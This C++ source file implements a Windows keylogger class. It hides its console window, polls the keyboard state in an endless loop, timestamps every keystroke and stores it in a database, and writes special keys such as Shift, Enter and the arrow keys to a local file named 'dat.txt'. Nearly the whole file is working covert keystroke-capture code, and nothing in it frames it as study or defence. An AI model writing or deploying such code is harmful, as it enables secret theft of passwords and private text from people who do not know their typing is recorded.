#include "keylogger.h"

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>

uint64_t timeSinceEpochMillisec() 
{
    using namespace std::chrono;
    return duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count();
}

void Keylogger::start(Database db)
{
    m_db = db;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY = 'x';

    while (true) {
        Sleep(10);
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767)
            {
                if (SpecialKeys(KEY) == false)
                {
                    uint64_t time = timeSinceEpochMillisec();
                    m_db.insertKey("keyboard", time, KEY);
                }
            }
        }
    }
}

void Keylogger::LOG(std::string input)
{
    std::fstream LogFile;
    LogFile.open("dat.txt", std::fstream::app);
    if (LogFile.is_open()) {
        LogFile << input << " ";
        LogFile.close();
    }
}

bool Keylogger::SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        LOG(" ");
        return true;
    case VK_RETURN:
        LOG("\n");
        return true;
    case '¾':
        LOG(".");
        return true;
    case VK_SHIFT:
        LOG("#SHIFT#");
        return true;
    case VK_BACK:
        LOG("\b");
        return true;
    case VK_RBUTTON:
        LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        LOG("#CAPS_LCOK");
        return true;
    case VK_TAB:
        LOG("#TAB");
        return true;
    case VK_UP:
        LOG("#UP_ARROW_KEY");
        return true;
    case VK_DOWN:
        LOG("#DOWN_ARROW_KEY");
        return true;
    case VK_LEFT:
        LOG("#LEFT_ARROW_KEY");
        return true;
    case VK_RIGHT:
        LOG("#RIGHT_ARROW_KEY");
        return true;
    case VK_CONTROL:
        LOG("#CONTROL");
        return true;
    case VK_MENU:
        LOG("#ALT");
        return true;
    default:
        return false;
    }
}